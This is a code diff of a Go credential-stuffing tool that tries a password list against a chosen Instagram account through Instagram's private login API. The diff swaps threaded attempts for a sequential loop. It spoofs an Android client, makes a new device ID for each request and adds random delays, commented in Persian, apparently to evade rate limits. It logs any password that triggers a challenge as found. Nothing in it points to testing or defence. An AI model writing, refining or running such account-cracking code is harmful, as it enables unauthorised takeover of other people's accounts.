@@ -11,7 +11,6 @@ import (
 	"net/url"
 	"os"
 	"strings"
-	"sync"
 	"time"
 )
 
@@ -19,9 +18,8 @@ const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-23 23:10:43"
+	CURRENT_TIME = "2025-05-23 23:14:48"
 	CURRENT_USER = "monsmain"
-	MAX_THREADS  = 3
 )
 
 type InstagramResponse struct {
@@ -32,13 +30,6 @@ type InstagramResponse struct {
 	Challenge  struct {
 		URL string `json:"url"`
 	} `json:"challenge"`
-}
-
-type LoginSession struct {
-	Username string
-	mutex    sync.Mutex
-	wg       sync.WaitGroup
-	found    bool
 }
 
 func main() {
@@ -56,10 +47,6 @@ func main() {
 	fmt.Print("Enter Instagram username: ")
 	fmt.Scanln(&username)
 
-	session := &LoginSession{
-		Username: username,
-	}
-
 	passwords := loadPasswords()
 	if len(passwords) == 0 {
 		fmt.Println("No passwords found in password.txt!")
@@ -69,68 +56,41 @@ func main() {
 	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
 	fmt.Println("\nStarting login attempts...\n")
 
-	chunks := splitPasswords(passwords, MAX_THREADS)
-	
-	for i, chunk := range chunks {
-		session.wg.Add(1)
-		go session.testPasswordChunk(chunk, i+1)
-	}
-
-	session.wg.Wait()
-
-	if !session.found {
-		fmt.Println("\n❌ No valid password found!")
-		saveResult(username, "", false)
-	}
-}
-
-func (s *LoginSession) testPasswordChunk(passwords []string, threadID int) {
-	defer s.wg.Done()
-
-	for _, password := range passwords {
-		if s.found {
-			return
-		}
-
-		s.mutex.Lock()
-		fmt.Printf("[Thread-%d] Testing password: %s\n", threadID, maskPassword(password))
-		s.mutex.Unlock()
-
-		success, response := s.tryLogin(password)
-
-		s.mutex.Lock()
+	for i, password := range passwords {
+		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
+		
+		success, response := tryLogin(username, password)
 		
 		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
 			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
-			fmt.Printf("Username: %s\n", s.Username)
+			fmt.Printf("Username: %s\n", username)
 			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
-			saveResult(s.Username, password, true)
-			s.found = true
-			s.mutex.Unlock()
+			saveResult(username, password, true)
 			return
 		} else {
 			if response.ErrorType == "bad_password" {
 				fmt.Println("❌ Invalid password")
 			} else if response.ErrorType == "invalid_user" {
 				fmt.Println("❌ Invalid username")
-				s.found = true
-				s.mutex.Unlock()
 				return
 			} else {
 				fmt.Printf("⚠️ Error: %s\n", response.Message)
 			}
 		}
-		s.mutex.Unlock()
 
-		time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
+		// افزایش فاصله زمانی بین درخواست‌ها
+		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
 	}
+
+	fmt.Println("\n❌ No valid password found!")
+	saveResult(username, "", false)
 }
 
-func (s *LoginSession) tryLogin(password string) (bool, InstagramResponse) {
+func tryLogin(username, password string) (bool, InstagramResponse) {
 	loginUrl := API_URL + "accounts/login/"
 	
 	data := url.Values{}
-	data.Set("username", s.Username)
+	data.Set("username", username)
 	data.Set("password", password)
 	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))
 
@@ -173,21 +133,6 @@ func (s *LoginSession) tryLogin(password string) (bool, InstagramResponse) {
 		   strings.Contains(string(body), "logged_in_user")
 
 	return success, response
-}
-
-func splitPasswords(passwords []string, n int) [][]string {
-	var chunks [][]string
-	chunkSize := (len(passwords) + n - 1) / n
-
-	for i := 0; i < len(passwords); i += chunkSize {
-		end := i + chunkSize
-		if end > len(passwords) {
-			end = len(passwords)
-		}
-		chunks = append(chunks, passwords[i:end])
-	}
-
-	return chunks
 }
 
 func loadPasswords() []string {
